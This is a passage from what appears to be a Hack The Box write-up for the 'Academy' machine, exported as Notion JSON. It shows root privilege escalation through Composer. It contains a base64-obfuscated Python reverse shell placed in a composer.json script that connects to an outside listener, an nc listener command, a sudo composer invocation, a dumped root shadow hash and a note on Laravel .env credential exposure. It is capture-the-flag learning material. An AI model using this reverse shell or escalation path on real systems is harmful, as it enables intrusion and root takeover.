base64:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/983bd97138d847668fd0ae679ba2305d","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["{\n\t\"scripts\": {\n\t\t\"pwn\": \"python3 -c \\\"import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE0LjUzJyw2OTY5KSkKd2hpbGUgMTogIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMucmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQucmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk='))\\\"\"\n\t}\n}"]],"language":"JSON","wrap":false}],"uri":"https://www.notion.so/e87f3d629e9849fda85b6ca4e8bd5501","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Write to "],["composer.json",[["c",null]]],[" the following:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/dd5ef97a0f5a4685b9e30112820df571","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ nc -lvnp 6969",[["c",null]]]]}],"uri":"https://www.notion.so/a5539f527bad46d7981da4dbeed44f57","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Before running the script, setup a listener for the reverse shell:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/af07453769d6435f9fd925c9223e44aa","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ sudo composer run-script --timeout=0 pwn",[["c",null]]]]}],"uri":"https://www.notion.so/ec3368d2e813447f94a4bb09286c1b97","type":"bulleted_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["Execute script with composer:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/2067952e47ff4710afb71ea58cccaebd","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ whoami && id",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/66d207cc812641289e65a80c7bb0a1b6","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["root\nuid=0(root) gid=0(root) groups=0(root)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/9688e82d513c4b16957e97faa133ac75","type":"bulleted_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["After a few seconds, we should get a reverse shell as root:"]]},{"children":[],"uri":"https://www.notion.so/87ec6071b6e543c8979394f1e9f35e24","type":"bulleted_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["Get root flag!"]]},{"children":[],"uri":"https://www.notion.so/8d22982089de4c139bb4e031eb97fe90","type":"heading","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["Persistence"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/a91a913278f1416396ea6d965657c7cd","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["root:$6$Haots4JVo2R7o2wP$XxlDAw9FgIGHZapROvxiKByJrGiZT0KHkoB9mLC4npT9wDOFsO3p9ad0ScF3tCKT.hk7uweN7KDK4EcmBEKv./:18481:0:99999:7:::"]],"language":"JSON","wrap":false}],"uri":"https://www.notion.so/381f93f2109e4d919ce8753850ba393e","type":"bulleted_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["Get root hash from the "],["/etc/shadow",[["c",null]]],[" file:"]]},{"children":[],"uri":"https://www.notion.so/e742fecc2ce142cf98eb62a0f776dd0c","type":"bulleted_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[[".env",[["c",null]]],[" file exposure on Laravel 5.5.21 (CVE-2017-16894) means we could have just read the database credentials directly from "],["http://10.10.10.215/academy/.env",[["a","http://10.10.10.215/academy/.env"]]],[", skipping the need for a www-data shell."]]},{"children":[],"uri":"https://www.notion.so/b6e967bdc9a84d328654781eaa3a2f2b","type":"heading","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["Resources"]],"depth":2},{"children":[],"uri":"https://www.notion.so/a81330b9a1dc4dbeb638637a59c0a17b","type":"numbered_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["https://nvd.nist.gov/vuln/detail/CVE-2018-15133",[["a","https://nvd.nist.gov/vuln/detail/CVE-2018-15133"]]]]},{"children":[],"uri":"https://www.notion.so/f2ba1b4d52904d59a6d33e47ef84f3e4","type":"numbered_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["https://nvd.nist.gov/vuln/detail/CVE-2017-16894",[["a","https://nvd.nist.gov/vuln/detail/CVE-2017-16894"]]]]},{"children":[],"uri":"https://www.notion.so/d4b3d7a7e9e840d88ef9260a23501cb6","type":"numbered_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["https://serverfault.com/questions/485473/what-is-the-canonical-use-for-the-sys-and-adm-groups",[["a","https://serverfault.com/questions/485473/what-is-the-canonical-use-for-the-sys-and-adm-groups"]]]]},{"children":[],"uri":"https://www.notion.so/9720da2e335e4438b0e7066c2605e5ca","type":"numbered_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["https://getcomposer.org/doc/articles/scripts.md",[["a","https://getcomposer.org/doc/articles/scripts.md"]]]]},{"children":[],"uri":"https://www.notion.so/f79d2b02808944ee8a54cb70ae26a169","type":"numbered_list","createdTime":1614689580000,"lastEditedTime":1614689580000,"title":[["https://gtfobins.github.io/gtfobins/composer/",[["a","https://gtfobins.github.io/gtfobins/composer/"]]]]}],"uri":"https://www.notion.so/493907f2acdb409390aeee701db0c4b2","type":"page","createdTime":1614688496542,"lastEditedTime":1614701160000,"title":[["Academy - 10.10.10.215"]],"icon":"https://www.hackthebox.eu/storage/avatars/10c8da0b46f53c882da946668dcdab95.png","fullWidth":true,"coverPosition":1,"properties":{"!`\"w":[["Yes"]],"'2]%":[["academy"]],"98uZ":[["Easy-difficulty Linux box about exploiting Laravel CVE-2018-15133 and privilege escalation with Composer."]],":H`m":[["Yes"]],"xY$N":[["‣",[["d",{"type":"datetime","time_zone":"Australia/Adelaide","start_date":"2021-03-03","start_time":"02:37"}]]]],"{iD?":[["Easy,Linux,Web Application,Laravel,Composer"]],"|Ay0":[["post"]],"title":[["Academy - 10.10.10.215"]],"34dcb6ea-0b54-4d5c-97f2-1b547c003948":[["Yes"]],"3fe3e3bf-9500-4abb-8acd-67aba88e6f47":[["https://www.hackthebox.eu/home/machines/profile/297",[["a","https://www.hackthebox.eu/home/machines/profile/297"]]]],"7df966e1-a25b-4512-8e5c-761390b4c971":[["‣",[["d",{"type":"datetimerange","end_date":"2020-12-14","end_time":"16:28","time_zone":"Australia/Adelaide","start_date":"2020-12-13","start_time":"18:52"}]]]],"91d2ba37-40ae-4835-a8e9-f8710a2ecaf6":[["Yes"]],"c8554f2b-cb52-4987-be70-6d00db874c2b":[["Yes"]]}}